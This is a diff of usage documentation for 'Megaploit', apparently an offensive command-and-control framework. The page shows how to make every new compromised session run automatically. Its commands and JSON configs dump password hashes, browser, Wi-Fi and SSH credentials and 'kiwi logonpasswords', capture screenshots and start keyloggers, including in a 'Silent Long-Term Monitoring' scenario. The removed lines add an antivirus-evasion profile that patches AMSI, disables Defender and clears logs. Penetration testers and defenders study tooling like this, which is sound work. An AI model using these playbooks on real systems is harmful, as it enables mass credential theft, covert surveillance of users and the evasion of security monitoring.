@@ -1,158 +1,286 @@
-# Post-Exploitation Pipeline Reference
+# Post-Exploitation Pipeline & AutoRunScript
 
-> **NEW in v3.0** — `megaploit/core/pipeline.py`
+Two complementary systems that automate actions on every new session.
+
+---
 
 ## Overview
 
-The **Post-Exploitation Pipeline** extends AutoRunScript with named **collection profiles**. When a new session opens, the pipeline runs the AutoRunScript baseline **plus** all active profiles, in one unified, deduplicated command list dispatched in a daemon thread.
+| System | What it does | How to configure |
+|---|---|---|
+| **Pipeline** | Runs a named collection profile on every new session | `pipeline enable <profile>` |
+| **AutoRunScript** | Runs per-OS and per-tag command lists | Edit `~/.megaploit_autorun.json` |
 
-This means operators can type `pipeline enable creds` once and have credential collection run automatically on every future session — without editing any config files.
+Both run automatically in a background thread when a new agent connects — the operator isn't blocked.
 
 ---
 
-## CLI Commands
+## Post-Exploitation Pipeline
+
+The pipeline runs **named profiles** on every new session. Profiles are collections of session commands that gather common data automatically.
+
+### Enable a profile
 
 ```
-pipeline status           Show active profiles + available profiles
-pipeline list             List all profiles with ● active / ○ inactive indicators
-pipeline enable <name>    Enable a profile (takes effect on next session)
-pipeline disable <name>   Disable a profile
-pipeline reload           Reload ~/.megaploit_autorun.json into the pipeline
-```
-
-**Example workflow:**
-
-```
-megaploit [0] » pipeline list
-  ○ basic
-  ○ creds
-  ○ full
-  ○ network
-  ○ recon
-
 megaploit [0] » pipeline enable creds
-[+] Pipeline profile creds enabled — active on next session.
-
-megaploit [0] » pipeline enable recon
-[+] Pipeline profile recon enabled — active on next session.
-
-megaploit [0] » pipeline status
-
-  ╭─── Post-Exploitation Pipeline ───────────────╮
-  │ Active profiles   creds, recon               │
-  │ Available         basic  creds  full  …      │
-  ╰───────────────────────────────────────────────╯
-
-# When session opens → runs: sysinfo (autorun) + all creds cmds + all recon cmds
-
-megaploit [0] » pipeline disable recon
-[+] Pipeline profile recon disabled.
+[+] Profile 'creds' enabled — will run on every new session
 ```
 
----
+### See what's active
 
-## Built-in Profiles
+```
+megaploit [0] » pipeline status
+  Active profiles:  creds, recon
+  Available:        basic, creds, recon, network, full
 
-| Profile | Commands |
+megaploit [0] » pipeline list
+  Profile   Status    Commands
+  basic     inactive  sysinfo, whoami, pwd, env
+  creds     ACTIVE    hashdump, wifi_passwords, browser_creds, ssh_harvest, cred_vault
+  recon     ACTIVE    ps, installed_software, scheduled_tasks, users, os_info
+  network   inactive  arp, netstat, ifconfig
+  full      inactive  (all of the above)
+```
+
+### Disable a profile
+
+```
+megaploit [0] » pipeline disable creds
+```
+
+### Available profiles
+
+| Profile | Commands run automatically |
 |---|---|
 | `basic` | `sysinfo`, `whoami`, `pwd`, `env` |
 | `creds` | `hashdump`, `wifi_passwords`, `browser_creds`, `ssh_harvest`, `cred_vault` |
 | `recon` | `ps`, `installed_software`, `scheduled_tasks`, `users`, `os_info` |
-| `network` | `arp`, `netstat`, `ifconfig`, `hosts_file` |
-| `full` | Union of `basic + creds + recon + network` |
+| `network` | `arp`, `netstat`, `ifconfig` |
+| `full` | All of the above combined |
 
----
-
-## Execution Flow
+### Example: Full automated recon + cred harvest
 
 ```
-Console._on_new_session(session)
-    │
-    ├── _pipeline.commands_for(session)
-    │   ├── _autorun.commands_for(session)   ← global + platform + tag rules
-    │   └── for each active profile:
-    │           add profile commands not already in the list
-    │   → deduplicated, ordered list
-    │
-    └── threading.Thread(daemon=True):
-            time.sleep(0.5)                  ← wait for session to stabilise
-            for cmd in cmds:
-                dispatch(session, cmd)       ← send via protocol
+megaploit [0] » pipeline enable full
+[+] Profile 'full' enabled
+
+# Now every new agent connection automatically runs:
+# sysinfo, whoami, pwd, env,
+# hashdump, wifi_passwords, browser_creds, ssh_harvest, cred_vault,
+# ps, installed_software, scheduled_tasks, users, os_info,
+# arp, netstat, ifconfig
 ```
 
-The 0.5 s delay prevents commands racing before the agent's main loop is ready.
+All results are saved to the credential store and loot directory automatically.
 
----
+### Reload pipeline config
 
-## Python API
+If you edit the AutoRunScript config file while Megaploit is running:
 
-```python
-from megaploit.core.pipeline import Pipeline, pipeline
-
-# Use the global singleton:
-pipeline.enable_profile("creds")
-pipeline.disable_profile("recon")
-
-# Check status:
-pipeline.active_profiles()        # ["creds"]
-pipeline.available_profiles()     # ["basic", "creds", "full", "network", "recon"]
-pipeline.is_enabled("creds")      # True
-
-# Get commands for a session:
-from unittest.mock import MagicMock
-sess = MagicMock()
-sess.os_name = "linux"
-sess.tag = "dc"
-cmds = pipeline.commands_for(sess)
-
-# Reload autorun config from disk:
-pipeline.reload_autorun()
-
-# Summary dict:
-info = pipeline.summary()
-# {
-#   "active_profiles": ["creds"],
-#   "available_profiles": ["basic", "creds", "full", "network", "recon"],
-#   "autorun": {"path": "~/.megaploit_autorun.json", "global": [...], ...}
-# }
-
-# Create an isolated instance (e.g. for testing):
-p = Pipeline()
-p.enable_profile("basic")
+```
+megaploit [0] » pipeline reload
 ```
 
 ---
 
-## Extending with Custom Profiles
+## AutoRunScript
 
-Profiles are defined in the `_PROFILES` dict in `megaploit/core/pipeline.py`. Add a new entry:
+AutoRunScript gives you finer control — run different commands based on the **OS** and **session tag**.
 
-```python
-# megaploit/core/pipeline.py  (after the built-in profiles)
+### Config file location
 
-_PROFILES["av_evasion"] = [
-    "patch_amsi",
-    "disable_defender",
-    "clear_logs",
-]
+```
+~/.megaploit_autorun.json
 ```
 
-The new profile appears immediately in `pipeline list` and `pipeline enable av_evasion` after a reload.
+### Create the default template
+
+```
+megaploit [0] » autorun save-default
+[+] Template written to ~/.megaploit_autorun.json
+```
+
+### View current config
+
+```
+megaploit [0] » autorun show
+```
+
+### Reload from disk
+
+```
+megaploit [0] » autorun reload
+```
+
+### Preview what would run for a session
+
+```
+megaploit [0] » autorun test 1
+# Shows exactly which commands would fire for session 1
+```
 
 ---
 
-## Relationship with AutoRunScript
+## Config File Reference
 
-The pipeline **wraps** AutoRunScript — it does not replace it. The baseline from `~/.megaploit_autorun.json` always runs first; profile commands are appended in sorted profile order, deduplicated.
-
+```json
+{
+  "global":  ["sysinfo", "whoami"],
+  "windows": ["os_info", "installed_software", "ps"],
+  "linux":   ["os_info", "find_suid", "env", "users"],
+  "macos":   ["os_info", "env"],
+  "tags": {
+    "dc":          ["hashdump", "users", "scheduled_tasks", "net_view"],
+    "workstation": ["browser_creds", "wifi_passwords", "ps", "keylog_start"],
+    "server":      ["services", "netstat", "users", "os_info"],
+    "web":         ["ps", "services", "find_files /var/www config"]
+  }
+}
 ```
-Final command list = deduplicate(autorun_commands + profile_commands)
-```
 
-If `sysinfo` appears in both the autorun global list and the `basic` profile, it only runs once (first occurrence wins).
+### Key sections
+
+| Section | When it runs |
+|---|---|
+| `"global"` | On **every** new session, regardless of OS |
+| `"windows"` | Only on Windows agents |
+| `"linux"` | Only on Linux/Unix agents |
+| `"macos"` | Only on macOS agents |
+| `"tags"` | Only when the session has a matching tag |
+
+### Execution order
+
+1. `global` commands run first
+2. OS-specific commands run next
+3. Tag-specific commands run last
 
 ---
 
-## Thread Safety
+## Session Tags
 
-`Pipeline._active_profiles` is a `set[str]` protected by `Pipeline._lock` (`threading.Lock`). All read/write operations go through `enable_profile`, `disable_profile`, `active_profiles`, and `commands_for` which all acquire the lock.
+Tags let you categorize sessions and trigger different autorun commands.
+
+### Set a tag on a session
+
+Inside the session or from global:
+
+```
+megaploit session(1) » tag dc
+megaploit session(1) » tag workstation
+megaploit session(1) » tag web-server
+```
+
+Or from global context (once a session has connected):
+
+```
+megaploit [3] » sessions -s dc     # find sessions tagged dc
+```
+
+### Tag-based AutoRunScript example
+
+Config:
+
+```json
+{
+  "global": ["sysinfo", "whoami"],
+  "tags": {
+    "dc": [
+      "hashdump",
+      "users",
+      "net_view",
+      "kiwi logonpasswords",
+      "scheduled_tasks"
+    ],
+    "workstation": [
+      "browser_creds all",
+      "wifi_passwords",
+      "ps",
+      "screenshot",
+      "keylog_start"
+    ]
+  }
+}
+```
+
+If a session is tagged `dc`, Megaploit automatically dumps hashes, users, and domain info.
+If tagged `workstation`, it automatically grabs browser credentials and starts the keylogger.
+
+---
+
+## Practical Scenarios
+
+### Scenario 1 — Internal Network Assessment
+
+You're doing an internal pentest and expect many connections from workstations and servers.
+Enable automatic recon and cred harvesting:
+
+```
+megaploit [0] » pipeline enable creds
+megaploit [0] » pipeline enable recon
+megaploit [0] » autorun save-default
+# Edit ~/.megaploit_autorun.json, then:
+megaploit [0] » autorun reload
+```
+
+Config:
+
+```json
+{
+  "global":  ["sysinfo", "whoami", "screenshot"],
+  "windows": ["installed_software", "startup_items", "scheduled_tasks"],
+  "linux":   ["find_suid", "services", "users"],
+  "tags": {
+    "dc":  ["hashdump", "net_view", "kiwi logonpasswords"],
+    "web": ["find_files /var/www password", "cat /etc/nginx/nginx.conf"]
+  }
+}
+```
+
+### Scenario 2 — Quick Credential Sweep
+
+If your only goal is to harvest credentials from as many machines as possible:
+
+```
+megaploit [0] » pipeline enable creds
+```
+
+Every new agent that connects automatically runs: `hashdump`, `wifi_passwords`, `browser_creds`, `ssh_harvest`, `cred_vault`.
+All creds are saved to the SQLite store. View them later:
+
+```
+megaploit [0] » creds show
+megaploit [0] » creds export all_creds.json
+```
+
+### Scenario 3 — Silent Long-Term Monitoring
+
+Set up monitoring without actively touching each session:
+
+```json
+{
+  "global": ["whoami", "screenshot"],
+  "windows": ["keylog_start"],
+  "linux": []
+}
+```
+
+Each new session automatically takes a screenshot and starts keylogging.
+
+```
+megaploit [0] » pipeline enable basic
+```
+
+---
+
+## What Happens When a Session Connects
+
+1. Agent connects and authenticates (HMAC-SHA256)
+2. Session is assigned an ID and added to the session table
+3. Console shows `★ NEW SESSION #N ★` notification
+4. Background thread starts (0.5s delay for session to stabilise)
+5. Pipeline commands run in order (one at a time)
+6. AutoRunScript commands run in order (global → OS → tags)
+7. All results saved to loot and credential store
+8. Session is ready for operator interaction
+
+The operator is never blocked — you can interact with other sessions while pipeline runs.
